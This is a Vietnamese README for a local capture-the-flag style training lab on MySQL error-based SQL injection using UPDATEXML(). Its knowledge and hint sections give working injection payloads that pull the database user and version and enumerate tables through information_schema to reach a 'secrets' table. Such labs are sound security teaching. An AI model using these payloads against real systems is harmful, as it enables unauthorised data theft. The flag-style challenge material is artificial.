# SQLi-010: MySQL UPDATEXML() Error-based SQLi

## 🎯 Mục Tiêu
Sử dụng hàm **UPDATEXML()** để extract data qua error - kỹ thuật tương tự EXTRACTVALUE nhưng syntax khác.

## 📝 Kịch Bản
User profile endpoint hiển thị thông tin user. Tham số `uid` vulnerable.

**URL Target:** `http://localhost:5010/profile?uid=1`

## 🎓 Kiến Thức
```sql
UPDATEXML(xml_target, xpath_expr, new_xml)
```
Payload: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--`

## 🚀 Chạy Lab
```bash
docker-compose up -d
# http://localhost:5010
```

## 💡 Hints
<details><summary>Hint 1</summary>
`?uid=1' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--`
</details>
<details><summary>Hint 2</summary>
Enumerate tables: `(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)`
</details>

## 🏁 Flag
Extract từ bảng `secrets`.
